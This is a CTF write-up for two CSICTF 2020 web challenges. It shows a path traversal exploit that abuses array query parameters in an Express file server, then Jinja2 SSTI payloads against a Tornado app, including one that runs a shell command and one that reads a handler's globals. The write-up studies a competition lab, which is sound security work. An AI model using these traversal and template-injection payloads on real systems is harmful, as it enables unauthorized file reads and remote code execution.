After a long week of work I decided to participate in CSICTF2k20 with my team Fword since I didn't participate for a long time :( We were among the top 30 teams and we managed to almost solve all Web exploitaion tasks with my teammate @Hera. However I enjoyed solving File Library and The Usual Suspects tasks.

# File Library 497pts (40 solves) #

 ![TASK](https://imgur.com/IRJZKbM.png)
 
 We are given the source code of the task :
 
 ```js
const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
    console.log(`Listening on port ${PORT}`);
});

app.get('/getFile', (req, res) => {
    let { file } = req.query;
    console.log("file is: "+file);
    if (!file) {
        res.send(`file=${file}\nFilename not specified!`);
        return;
    }

    try {

        if (file.includes(' ') || file.includes('/')) {
            res.send(`file=${file}\nInvalid filename!`);
            return;
        }
    } catch (err) {
        res.send('An error occured!');
        return;
    }

    if (!allowedFileType(file)) {
        res.send(`File type not allowed`);
        return;
    }

    if (file.length > 5) {
        file = file.slice(0, 5);
    }

    const returnedFile = path.resolve(__dirname + '/' + file);
   console.log("returnedFile: "+returnedFile);
    fs.readFile(returnedFile, (err) => {
        if (err) {
            if (err.code != 'ENOENT') console.log(err);
            res.send('An error occured!');
            return;
        }

        res.sendFile(returnedFile);
    });
});

app.get('/*', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

function allowedFileType(file) {
    const format = file.slice(file.indexOf('.') + 1);
console.log("index +1 is "+file.indexOf('.') + 1);    
console.log("format inside allowedfile is: "+format);
    if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
}

 ```
 I added some logging statements to facilitate things, as you can see when we visit **/getfile** we can provide in a get parameter a filename that will be displayed for us but there are some restrictions,
 we can't use whitespaces or "/", there are only four extensions that are allowed (js|ts|c|cpp) .

![TASK](https://imgur.com/ClTfqlL.png)
 
 After reading carefully the source code, I was pretty sure that we will use http parameters pollution because there is no check concerning the type of get parameters so we can enter an array and try to exploit the misbehaviour that may occur.
 
 Let's imagine that we enter the following array :
 
 > ["../../","../../","../../","../../","../../proc/self/cwd/flag.txt",".","js"]
 
* **1st Check** : ``` if (file.includes(' ') || file.includes('/')) ``` 
 
 When includes is applied to an array it will check if there's a field that is equal to the passed parameter (" " and "/" in our case) which is false here so we can successfully pass this check
 
* **2nd Check** : ``` if (!allowedFileType(file)) ```

Let's take a look at the code of this function :

```js

function allowedFileType(file) {
const format = file.slice(file.indexOf('.') + 1);
    if (format == 'js' || format == 'ts' || format == 'c' || format == 'cpp') {
        return true;
    }

    return false;
}

```

It will slice our array beginning from the indexOf(".")+1 so in our case the result will be the last field of our array which is "js" and Bingo we will also pass this check :D

The following lines will remove the last two fields of our array :

```js
if (file.length > 5) {
  file = file.slice(0, 5);
}
```
so our array will become:

> ["../../","../../","../../","../../","../../proc/self/cwd/flag.txt"]

And finally after resolving the path returnedFile will contain /proc/self/cwd/flag.txt

```js
const returnedFile = path.resolve(__dirname + '/' + file);
```
**Note:** __dirname which is the current directory is ignored because of our "../../" fields, and **/proc/self/cwd** is equivalent to the current directory.

So finally our array will be resolved to the path we want, this is the final payload which is only a traduction to what we said before:

```
http://chall.csivit.com:30222/getfile?file[]=../../&file[]=../../&file[]=../../&file[]=../../&file[]=../../proc/self/cwd/flag.txt&file[]=.&file[]=js
```
![TASK](https://imgur.com/sdvZ1eL.png)

It was a really nice task so thanks to the author!

# The Usual Suspects 499pts (32 solves) #
 
![TASK](https://imgur.com/qorhTCy.png)
 
 Visiting the website, a well trained eye can directly notice the possibility of an SSTI attack in icecream parameter.
 
![TASK](https://imgur.com/zbwADG6.png) 
 
We thought that it was a typical SSTI task but unfortunately even after getting RCE using the usual jinja2 SSTI payloads we didn't find anything. The first payload we used:

> {{ ''.__class__.__mro__[1].__subclasses__()\[270\]('ls',shell=True,stdout=-1).communicate()}}

After this step we really didn't know what to do, the server used here was Tornado, which is an asynchronous python web server so I started reading its documentation and I noticed that the Main class always inherits from **tornado.web.RequestHandler**.
After some digging I got a nice idea , what if we list all the subclasses of Object ( The super class, it's the parent of all classes) Then we will list the subclasses of tornado.web.RequestHandler and finally we will check the globals of **get** function from MainHadnler class.

* Get the RequestHandler class:

> {{ ''.__class__.__mro__[1].__subclasses__()[363]}} 

* Get the MainHandler class which inherits from RequestHandler

> {{ ''.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1]}} 

And finally we will see the __globals__ of get function ( **__globals__** is a reference to the dictionary that holds the function’s global variables ).
Final payload: 

```
{{ ''.__class__.__mro__[1].__subclasses__()[363].__subclasses__()[-1].get.__globals__}}
```
Bingo we got our flag :D I asked the admin and he told me that this is the unintended solution of the task.

![DISCORD](https://imgur.com/8pcqJ3T.png)

If you have any questions you can contact me on twitter @BelkahlaAhmed1 or contact our team twitter @FwordTeam ! I hope that you liked the writeup, and don't forget to participate in FwordCTF on 29th of August , a lot of fun challenges will be there.
